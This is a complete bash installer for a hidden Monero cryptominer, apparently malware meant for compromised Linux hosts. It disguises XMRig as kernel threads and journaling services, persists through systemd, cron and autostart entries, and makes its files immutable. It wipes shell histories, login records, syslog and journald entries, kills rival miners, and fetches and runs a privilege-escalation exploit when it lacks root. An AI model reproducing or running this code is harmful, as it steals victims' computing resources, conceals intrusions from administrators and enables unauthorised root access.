#!/usr/bin/env bash
VERSION="5.5-ultimate-stable"
C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
LPE_EXPLOIT_URL="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/main/copyfail.py"

KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
STOP_UDEV="${STOP_UDEV:-0}"
WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"

log()  { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

unset HISTFILE
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

if command -v nice >/dev/null 2>&1; then
  _NICE_PREFIX="nice -n 19"
else
  _NICE_PREFIX=""
fi

# ============================================================
# GLOBAL CLEANUP
# ============================================================
log "[*] Cleaning up old instances..."

if command -v pkill >/dev/null 2>&1; then
  pkill -9 -f "ksoftirqd-" 2>/dev/null || true
  pkill -9 -f "\.jbd2-" 2>/dev/null || true
  pkill -9 -f "\.kwork" 2>/dev/null || true
fi

if command -v systemctl >/dev/null 2>&1; then
  for _s in /etc/systemd/system/jbd2-journal-*.service; do
    [ -f "$_s" ] || continue
    systemctl disable --now "$(basename "$_s")" 2>/dev/null || true
    [ "$HAS_ROOT" = "1" ] && chattr -i "$_s" 2>/dev/null || true
    rm -f "$_s" 2>/dev/null || true
  done
  for _s in /home/*/.config/systemd/user/jbd2-journal-*.service /root/.config/systemd/user/jbd2-journal-*.service; do
    [ -f "$_s" ] || continue
    rm -f "$_s" 2>/dev/null || true
  done
  systemctl daemon-reload 2>/dev/null || true
fi

for _d in /tmp/.jbd2-* /var/tmp/.jbd2-* /dev/shm/.jbd2-* /run/user/*/.jbd2-* \
          /root/.local/share/.jbd2-* /home/*/.local/share/.jbd2-* \
          /root/.cache/.jbd2-* /home/*/.cache/.jbd2-* \
          /root/.config/.jbd2-* /home/*/.config/.jbd2-*; do
  [ -d "$_d" ] || continue
  [ "$HAS_ROOT" = "1" ] && chattr -R -i "$_d" 2>/dev/null || true
  rm -rf "$_d" 2>/dev/null || true
done

if command -v crontab >/dev/null 2>&1; then
  crontab -l 2>/dev/null | grep -v "jbd2-journal" | grep -v "\.jbd2-" | crontab - 2>/dev/null || true
fi

rm -f /home/*/.config/autostart/jbd2-flush.desktop /root/.config/autostart/jbd2-flush.desktop 2>/dev/null || true

# Dọn dẹp rác trong bashrc để tránh lỗi tự sát từ các bản cũ
for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
  [ -f "$RC" ] || continue
  sed -i '/jbd2-/d' "$RC" 2>/dev/null || true
done

sleep 1
log "[*] Cleanup complete. Proceeding with new installation..."

# ============================================================
# BẮT ĐẦU CÀI ĐẶT MỚI
# ============================================================
RAND_SUFFIX=$(head -c 16 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9' | head -c 8)
[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s%N | sha256sum | head -c 8)"

DISGUISE_BIN="ksoftirqd-${RAND_SUFFIX}"
DISGUISE_ARGV="[ksoftirqd/2]"
SERVICE_NAME="jbd2-journal-${RAND_SUFFIX}.service"
DIR_SUFFIX=".jbd2-${RAND_SUFFIX}"
CONFIG_NAME="ld.cache.bak"
WRAPPER_NAME=".journal-${RAND_SUFFIX}"

_escape_re() {
  if command -v sed >/dev/null 2>&1; then
    printf '%s' "$1" | sed 's/[][\.^$*+?(){}|]/\\&/g'
  else
    printf '%s' "${1//./\\.}"
  fi
}

backup_if_exists() {
  local f="$1"
  [ -f "$f" ] && cp -p "$f" "${f}.bak.$(TS)" 2>/dev/null && log "[*] Backup: $f"
}

_can_exec_in() {
  local d="$1" probe="$d/.xp-$$"
  printf '#!/bin/sh\nexit 0\n' >"$probe" 2>/dev/null || return 1
  chmod 700 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
  ( "$probe" ) >/dev/null 2>&1; local rc=$?
  rm -f "$probe" 2>/dev/null
  return $rc
}

INSTALL_DIR=""
CANDIDATES=(
  "${XDG_DATA_HOME:-${HOME:-}/.local/share}/${DIR_SUFFIX}"
  "${HOME:-}/.cache/${DIR_SUFFIX}" "${HOME:-}/.config/${DIR_SUFFIX}"
  "${HOME:-}/${DIR_SUFFIX}" "${HOME:-}/.local/${DIR_SUFFIX}"
  "/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/var/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/dev/shm/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
  "/run/user/$(id -u 2>/dev/null || echo 0)/${DIR_SUFFIX}"
  "./${DIR_SUFFIX}"
)

for c in "${CANDIDATES[@]}"; do
  case "$c" in */*) ;; *) continue ;; esac
  mkdir -p "$c" 2>/dev/null || continue
  [ -w "$c" ] || continue
  _can_exec_in "$c" || continue
  INSTALL_DIR="$c"; break
done

if [ -z "$INSTALL_DIR" ]; then
  for last in /dev/shm /tmp /var/tmp; do
    [ -w "$last" ] || continue
    INSTALL_DIR="$last/${DIR_SUFFIX}-fallback-$$"
    mkdir -p "$INSTALL_DIR" 2>/dev/null && _can_exec_in "$INSTALL_DIR" && break
  done
fi
[ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] || fail "No writable directory found"

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null

[ -z "$WALLET" ] && { echo "Setup v$VERSION"; echo "Usage: $0 <wallet> [email]"; exit 1; }

if [ "$HAS_ROOT" -eq 1 ]; then
    if [ -n "$EMAIL" ]; then PASS="root:${EMAIL}"; else PASS="root"; fi
else
    if [ -n "$EMAIL" ]; then PASS="x:${EMAIL}"; else PASS="x"; fi
fi

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) fail "Wrong wallet length: ${#WALLET_BASE}" ;; esac

_cur_v="$(ulimit -v 2>/dev/null || echo unlimited)"
if [ "$_cur_v" != "unlimited" ] && [ "${_cur_v:-0}" -lt 524288 ] 2>/dev/null; then
  ulimit -v unlimited 2>/dev/null || ulimit -v 1048576 2>/dev/null || true
  _new_v="$(ulimit -v 2>/dev/null || echo unlimited)"
  if [ "$_new_v" != "unlimited" ] && [ "${_new_v:-0}" -lt 524288 ] 2>/dev/null; then
    fail "Cannot increase ulimit -v."
  fi
fi

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
[ "$CPU_THREADS" -ge 1 ] 2>/dev/null || CPU_THREADS=1

MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"
case "$MEM_MB" in ''|*[!0-9]*) MEM_MB=0 ;; esac

_HINT_ENV="${THREADS_HINT:-}"
if [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 2048 ]; then
  RX_MODE=light; HP_BOOL=false; _hint=50; THREADS_CAP=1
elif [ "$MEM_MB" -gt 0 ] && [ "$MEM_MB" -lt 4096 ]; then
  RX_MODE=light; HP_BOOL=false; _hint=75; THREADS_CAP=2
else
  RX_MODE=auto; HP_BOOL=true; _hint=100; THREADS_CAP="$CPU_THREADS"
fi
THREADS_HINT="${_HINT_ENV:-$_hint}"

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

log "Setup v$VERSION | threads=$CPU_THREADS | mem=${MEM_MB}MB | rx=$RX_MODE | port=$PORT | pass=$PASS"
log "Dir=$INSTALL_DIR"

is_gzip() {
  [ -s "$1" ] || return 1
  local magic
  magic="$(head -c 2 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "1f8b" ] || return 1
  if command -v gzip >/dev/null 2>&1; then gzip -t "$1" >/dev/null 2>&1; else return 0; fi
}

download_file() {
  local url="$1" out="$2" tmp="$2.part"
  rm -f "$tmp" 2>/dev/null
  if command -v curl >/dev/null 2>&1; then
    if curl -fL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null && is_gzip "$tmp"; then mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
    if curl -kfL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null && is_gzip "$tmp"; then mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
  fi
  if command -v wget >/dev/null 2>&1; then
    if wget -q -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null && is_gzip "$tmp"; then mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
    if wget -q --no-check-certificate -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null && is_gzip "$tmp"; then mv -f "$tmp" "$out"; return 0; fi
    rm -f "$tmp"
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$tmp" <<'PY' 2>/dev/null && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
import sys, urllib.request, ssl
try:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(sys.argv[1], headers={"User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r, open(sys.argv[2],'wb') as f:
        while True:
            chunk = r.read(65536)
            if not chunk: break
            f.write(chunk)
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
    rm -f "$tmp"
  fi
  return 1
}

download_text() {
  local url="$1" out
  if command -v curl >/dev/null 2>&1; then
    out="$(curl -fsSL --retry 2 --connect-timeout 15 --max-time 60 -H 'Accept: application/vnd.github+json' -H 'User-Agent: installer' "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v wget >/dev/null 2>&1; then
    out="$(wget -qO- --header='Accept: application/vnd.github+json' --user-agent='installer' --timeout=30 --tries=2 "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  return 1
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

install_latest_official_xmrig() {
  local url ver tmp found
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$DISGUISE_BIN" ]; then return 0; fi
  url="$(get_latest_xmrig_url)" || return $?
  tmp="$(mktemp -d)" || return 1
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null
  download_file "$url" "$ARCHIVE" || { rm -rf "$tmp"; return 1; }
  
  if ! tar xzf "$ARCHIVE" -C "$tmp" --strip-components=1 2>/dev/null; then
    tar xzf "$ARCHIVE" -C "$tmp" 2>/dev/null || { rm -rf "$tmp" "$ARCHIVE"; return 1; }
  fi
  rm -f "$ARCHIVE"
  
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null
  rm -rf "$tmp"; return 0
}

install_c3pool_package() {
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null
  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" || download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  local tmp found
  tmp="$(mktemp -d)" || return 1
  if ! tar xzf "$ARCHIVE" -C "$tmp" --strip-components=1 2>/dev/null; then
    tar xzf "$ARCHIVE" -C "$tmp" 2>/dev/null || { rm -rf "$tmp"; return 1; }
  fi
  rm -f "$ARCHIVE"
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null
  rm -rf "$tmp"
  [ -x "$INSTALL_DIR/$DISGUISE_BIN" ]
}

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    sudo systemctl stop "$svc" 2>/dev/null || systemctl stop "$svc" 2>/dev/null || true
  done
fi

log "[*] Preparing package"
if ! install_latest_official_xmrig; then
  install_c3pool_package || fail "Unable to download release or fallbacks"
fi

if command -v timeout >/dev/null 2>&1; then _TO="timeout 15"; else _TO=""; fi
if ! $_TO "$INSTALL_DIR/$DISGUISE_BIN" --version >/dev/null 2>&1; then
  if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
    { apk add --no-cache xmrig >/dev/null 2>&1 && command -v xmrig >/dev/null 2>&1 && cp "$(command -v xmrig)" "$INSTALL_DIR/$DISGUISE_BIN" && chmod +x "$INSTALL_DIR/$DISGUISE_BIN"; } || fail "Alpine fallback failed"
  else
    fail "Binary is not functional"
  fi
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": true, "background": false, "colors": false, "title": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": $THREADS_HINT, "asm": true, "argon2-impl": null },
    "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true },
    "cuda": { "enabled": false, "loader": null, "nvml": true },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",     "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true }
    ],
    "print-time": 60, "health-print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false,
    "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
    "dns": { "ip_version": 4, "ttl": 30 },
    "user-agent": null, "verbose": 0, "watch": true,
    "pause-on-battery": false, "pause-on-active": false
}
EOF_CONFIG
)

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_PATH" ]; then :; else
  backup_if_exists "$CONFIG_PATH"; printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
fi

if [ "$HP_BOOL" = "true" ] && [ "$HAS_ROOT" = "1" ]; then
  sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true
  if ! grep -q '^vm.nr_hugepages' /etc/sysctl.conf 2>/dev/null; then
    echo 'vm.nr_hugepages=1280' | sudo tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
  fi
fi

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
backup_if_exists "$RUNNER"

# ============================================================
# RUNNER TỐI ƯU: KHÔNG PKILL, CHỈ DÙNG FLOCK VÀ CHECK PID
# ============================================================
cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || exit 1
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

# Sử dụng flock để đảm bảo chỉ 1 tiến trình RUNNER được chạy tại 1 thời điểm
exec 9> .miner.lck
flock -n 9 || exit 0

RUNNING=0
if [ -f .miner.pid ]; then
    OLD_PID=\$(tr -d '[:space:]' < .miner.pid 2>/dev/null)
    if [ -n "\$OLD_PID" ]; then
        if kill -0 "\$OLD_PID" 2>/dev/null; then
            # Kiểm tra xem tiến trình đó có đúng là miner không (dựa vào tên cmdline)
            if tr '\0' ' ' < /proc/\$OLD_PID/cmdline 2>/dev/null | grep -q "ksoftirqd-"; then
                RUNNING=1
            fi
        fi
    fi
fi

if [ "\$RUNNING" -eq 0 ]; then
    # KHÔNG DÙNG PKILL Ở ĐÂY. Chỉ khởi chạy tiến trình mới.
    $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" "$INSTALL_DIR/$DISGUISE_BIN" --config="$CONFIG_PATH" --no-color --quiet >/dev/null 2>&1 &
    echo \$! > .miner.pid
    disown \$! 2>/dev/null || true
fi
EOF_MINER
chmod +x "$RUNNER"

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  SVC_FILE="$INSTALL_DIR/.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=JBD2 Journaling Block Device
After=network-online.target
Wants=network-online.target

[Service]
Type=forking
PIDFile=$INSTALL_DIR/.miner.pid
ExecStart=/usr/bin/env bash $RUNNER
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
CPUShares=2
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  INSTALL_OK=1
  if [ -f "$TARGET" ] && cmp -s "$SVC_FILE" "$TARGET"; then
    log "[*] Service unchanged"
  else
    [ -f "$TARGET" ] && cp -p "$TARGET" "${TARGET}.bak.$(TS)" 2>/dev/null
    cp "$SVC_FILE" "$TARGET" 2>/dev/null || INSTALL_OK=0
  fi
  if [ "$INSTALL_OK" = "1" ]; then
    systemctl daemon-reload 2>/dev/null
    systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
    systemctl restart "$SERVICE_NAME" 2>/dev/null \
      && log "[*] Service installed: $SERVICE_NAME" \
      || { log "WARN: systemd install failed - fallback"; HAS_ROOT=0; }
  else
    log "WARN: systemd install failed - fallback"; HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"; mkdir -p "$USER_DIR" 2>/dev/null
    USVC_FILE="$USER_DIR/$SERVICE_NAME"; backup_if_exists "$USVC_FILE"
    cat > "$USVC_FILE" <<EOF_USERVICE
[Unit]
Description=JBD2 Journaling Block Device
After=network.target

[Service]
Type=forking
PIDFile=$INSTALL_DIR/.miner.pid
ExecStart=/usr/bin/env bash $RUNNER
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  if command -v crontab >/dev/null 2>&1; then
    CRON_LINE="@reboot $RUNNER >/dev/null 2>&1"
    crontab -l 2>/dev/null | grep -F -q "$RUNNER" || \
      { crontab -l 2>/dev/null; echo "$CRON_LINE"; } | crontab - 2>/dev/null || true
  fi
  if [ -d "$HOME/.config" ] || mkdir -p "$HOME/.config" 2>/dev/null; then
    AD="$HOME/.config/autostart"; mkdir -p "$AD" 2>/dev/null
    AS_FILE="$AD/jbd2-flush.desktop"; backup_if_exists "$AS_FILE"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=Journal Flush Service
Exec=bash $RUNNER
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  bash "$RUNNER" >/dev/null 2>&1 & disown 2>/dev/null || true
fi

if command -v chattr >/dev/null 2>&1; then
  chmod 000 "$CONFIG_PATH" 2>/dev/null || true
  chattr +i "$CONFIG_PATH" 2>/dev/null || true
  chattr +i "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  chattr +i "$RUNNER" 2>/dev/null || true
  [ -f "/etc/systemd/system/$SERVICE_NAME" ] && chattr +i "/etc/systemd/system/$SERVICE_NAME" 2>/dev/null || true
fi

if [ "$HAS_ROOT" -eq 1 ]; then
  for _ud in /root /home/*; do
    [ -d "$_ud" ] || continue
    for _hf in .bash_history .zsh_history .zhistory .sh_history .history; do
      [ -f "$_ud/$_hf" ] && rm -f "$_ud/$_hf" 2>/dev/null || true
    done
    ln -sf /dev/null "$_ud/.bash_history" 2>/dev/null || true
    ln -sf /dev/null "$_ud/.zsh_history" 2>/dev/null || true
  done

  for _lf in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
    [ -f "$_lf" ] && : > "$_lf" 2>/dev/null || true
  done

  for _lg in /var/log/syslog /var/log/messages /var/log/auth.log /var/log/secure; do
    [ -f "$_lg" ] || continue
    sed -i "/$DISGUISE_BIN/d" "$_lg" 2>/dev/null || true
    sed -i "/\.jbd2-/d" "$_lg" 2>/dev/null || true
    sed -i "/c3pool/d" "$_lg" 2>/dev/null || true
    sed -i "/supportxmr/d" "$_lg" 2>/dev/null || true
    sed -i "/xmrig/d" "$_lg" 2>/dev/null || true
  done

  if command -v journalctl >/dev/null 2>&1; then
    journalctl --rotate 2>/dev/null || true
    journalctl --vacuum-time=1s 2>/dev/null || true
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
    log "[*] Attempting Local Privilege Escalation (LPE)..."
    CF_PY="/tmp/.cf_$(head -c 4 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9').py"
    
    if command -v curl >/dev/null 2>&1; then curl -fsSLk -o "$CF_PY" "$LPE_EXPLOIT_URL" 2>/dev/null || true
    elif command -v wget >/dev/null 2>&1; then wget -q --no-check-certificate -O "$CF_PY" "$LPE_EXPLOIT_URL" 2>/dev/null || true
    fi

    if [ -s "$CF_PY" ]; then
        timeout 15s python3 "$CF_PY" >/dev/null 2>&1 &
        CF_PID=$!
        wait $CF_PID 2>/dev/null || true
        rm -f "$CF_PY" 2>/dev/null || true
        log "[*] LPE triggered. If successful, re-run this script to install root persistence."
    else
        log "[-] LPE PoC download failed."
    fi
fi

sleep 3
log "[*] Setup complete"
log "[*] Verify: ps -eo pid,comm,args | grep 'ksoftirqd'"
